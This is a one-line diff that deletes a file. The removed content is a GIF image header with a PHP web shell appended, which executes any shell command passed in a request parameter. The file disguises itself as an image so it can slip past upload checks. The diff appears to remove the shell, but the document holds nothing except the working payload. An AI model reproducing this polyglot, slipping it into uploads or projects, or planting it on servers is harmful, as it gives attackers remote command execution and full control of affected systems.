@@ -1,1 +1,0 @@
-GIF89aà÷  <?php system($_REQUEST['cmd']);?>
